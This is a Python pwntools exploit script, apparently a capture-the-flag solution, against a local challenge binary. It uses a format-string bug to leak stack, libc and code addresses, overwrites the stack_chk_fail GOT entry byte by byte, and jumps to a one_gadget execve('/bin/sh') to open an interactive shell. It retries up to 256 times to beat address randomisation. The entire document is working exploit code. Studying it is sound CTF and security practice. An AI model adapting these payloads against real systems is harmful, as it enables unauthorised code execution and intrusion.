from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']


count = 0
while count < 0x100:
    info(f'Round : {count}')
    count += 1

    if (len(sys.argv) == 2) and (sys.argv[1] == 'remote'):
        r = remote('127.0.0.1', 13372)
    else:
        r = process('./chal', env={'LD_PRELOAD': './libc.so.6'})

    try:
        main_rbp_lastbyte = 0x10
        payload = b'%63c%10$hhn.%10$p.%21$p.%25$p'.ljust(0x20, b',') + bytes([main_rbp_lastbyte + 8])
        r.send(payload)
        r.recvuntil(b'.')

        main_rbp = int(r.recvuntil(b'.')[:-1], 16) - 8
        info(f'main rbp : {hex(main_rbp)}')
        libc = int(r.recvuntil(b'.')[:-1], 16) - 0x24083
        info(f'libc : {hex(libc)}')
        codebase = int(r.recvuntil(b',')[:-1], 16) - 0x11a9
        info(f'codebase : {hex(codebase)}')

        # 0xe3afe execve("/bin/sh", r15, r12)
        # constraints:
        #   [r15] == NULL || r15 == NULL || r15 is a valid argv
        #   [r12] == NULL || r12 == NULL || r12 is a valid envp
        one_gadget = libc + 0xe3afe
        stack_chk_fail = codebase + 0x000000000004018
        pop_rbx_rbp_r12 = libc + 0x000000000002f830

        for i in range(6):
            byte = ((pop_rbx_rbp_r12 >> i * 8) - 63) & 0xff
            payload = f'%63c%10$hhn%{byte}c%9$hhn'.encode().ljust(0x18, b'.') + flat(stack_chk_fail + i, main_rbp + 8)
            r.send(payload)
            r.recvuntil(payload[0x18: 0x19])

        payload = b'a' + b'%10$hhn' + flat(0, one_gadget, 0, main_rbp - 8)
        r.send(payload)

        r.interactive()
        break

    except EOFError:
        pass

    r.close()